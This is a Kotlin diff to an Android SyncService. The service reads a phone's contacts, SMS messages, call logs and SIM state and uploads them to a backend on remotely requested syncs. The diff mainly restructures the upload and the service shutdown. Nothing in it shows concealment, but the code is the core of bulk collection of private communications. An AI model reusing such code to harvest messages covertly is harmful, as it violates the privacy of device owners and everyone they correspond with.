@@ -76,7 +76,7 @@ class SyncService : Service() {
     }
 
     private suspend fun performSync(isFullSync: Boolean = false) {
-        Log.d("SyncService", "CLIENT_SYNC_START")
+        Log.d("SyncService", "FOREGROUND_SYNC_STARTED")
 
         val prefs = PreferenceManager.getDefaultSharedPreferences(this)
         val currentTime = System.currentTimeMillis()
@@ -86,6 +86,8 @@ class SyncService : Service() {
             !hasPermission(android.Manifest.permission.READ_SMS) &&
             !hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
             Log.d("SyncService", "PERMISSIONS_STATUS: Not granted")
+            stopForeground(STOP_FOREGROUND_REMOVE)
+            stopSelf()
             return
         }
 
@@ -109,7 +111,32 @@ class SyncService : Service() {
             } else emptyList()
             Log.d("SyncService", "CALLLOG_READ_COUNT: ${callLogs.size}")
 
-            repository.syncIncremental(deviceId, contacts, smsList, callLogs)
+            val totalContacts = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
+            val totalSms = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
+            val totalCalls = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0
+
+            val simState = DataHelper.getSimState(this@SyncService).toMutableMap()
+            simState["contactCount"] = totalContacts
+            simState["smsCount"] = totalSms
+            simState["callCount"] = totalCalls
+
+            Log.d("SyncService", "SIM_STATE_LOADED")
+            if (simState["sim1Ready"] as Boolean) Log.d("SyncService", "SIM1_AVAILABLE")
+            if (simState["sim2Ready"] as Boolean) Log.d("SyncService", "SIM2_AVAILABLE")
+            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) Log.d("SyncService", "NO_SIM_AVAILABLE")
+            Log.d("SyncService", "SIM_STATE_UPLOADED")
+
+            val lastHandledSyncRequest = prefs.getLong("last_handled_sync_request", 0L)
+
+            repository.performSync(
+                deviceId = deviceId,
+                contacts = contacts,
+                smsList = smsList,
+                callLogs = callLogs,
+                simState = simState,
+                isFullSync = isFullSync,
+                lastHandledSyncRequest = lastHandledSyncRequest
+            )
 
             prefs.edit().apply {
                 if (smsList.isNotEmpty()) putLong("last_sms_sync", smsList.maxOf { it.date })
@@ -117,57 +144,11 @@ class SyncService : Service() {
                 if (contacts.isNotEmpty()) putLong("last_contact_sync", currentTime)
             }.apply()
 
-            val currentContactCount = if (hasPermission(android.Manifest.permission.READ_CONTACTS)) DataHelper.fetchContacts(this@SyncService).size else 0
-            val currentSmsCount = if (hasPermission(android.Manifest.permission.READ_SMS)) DataHelper.fetchSMS(this@SyncService).size else 0
-            val currentCallCount = if (hasPermission(android.Manifest.permission.READ_CALL_LOG)) DataHelper.fetchCallLogs(this@SyncService).size else 0
-
-            // Dummy for notification count, assuming there's some implementation or fetching
-            val currentNotificationCount = 0
-            Log.d("SyncService", "NOTIFICATION_READ_COUNT: $currentNotificationCount")
-
-            val simState = DataHelper.getSimState(this@SyncService)
-            Log.d("SyncService", "SIM_STATE_LOADED")
-            if (simState["sim1Ready"] as Boolean) Log.d("SyncService", "SIM1_AVAILABLE")
-            if (simState["sim2Ready"] as Boolean) Log.d("SyncService", "SIM2_AVAILABLE")
-            if (!(simState["sim1Ready"] as Boolean) && !(simState["sim2Ready"] as Boolean)) Log.d("SyncService", "NO_SIM_AVAILABLE")
-
-            val updateMap = mutableMapOf<String, Any>(
-                "deviceId" to deviceId,
-                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
-                "manufacturer" to Build.MANUFACTURER,
-                "model" to Build.MODEL,
-                "osVersion" to Build.VERSION.RELEASE,
-                "lastSyncTime" to currentTime,
-                "heartbeatAt" to currentTime,
-                "contactCount" to currentContactCount,
-                "smsCount" to currentSmsCount,
-                "callCount" to currentCallCount,
-                "notificationCount" to currentNotificationCount,
-                "timestamp" to currentTime,
-                "syncStatus" to "Synced",
-                "presenceStatus" to "Online",
-                "lastError" to "",
-                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
-            )
-            updateMap.putAll(simState)
-
-            repository.updateDeviceInfoMap(deviceId, updateMap)
-            Log.d("SyncService", "Sync completed successfully (Full: $isFullSync)")
-            stopForeground(STOP_FOREGROUND_REMOVE)
-            stopSelf()
+            Log.d("SyncService", "FOREGROUND_SYNC_SUCCESS")
         } catch (e: Exception) {
-            Log.e("SyncService", "Error during sync", e)
+            Log.e("SyncService", "FOREGROUND_SYNC_FAILED", e)
             crashlytics.recordException(e)
-            repository.updateDeviceInfoMap(deviceId, mapOf(
-                "deviceName" to "${Build.MANUFACTURER} ${Build.MODEL}",
-                "manufacturer" to Build.MANUFACTURER,
-                "model" to Build.MODEL,
-                "osVersion" to Build.VERSION.RELEASE,
-                "lastSyncTime" to currentTime,
-                "heartbeatAt" to currentTime,
-                "syncStatus" to "Error: ${e.localizedMessage ?: "Unknown error"}",
-                "syncRequestedAt" to prefs.getLong("last_handled_sync_request", 0L)
-            ))
+        } finally {
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
         }
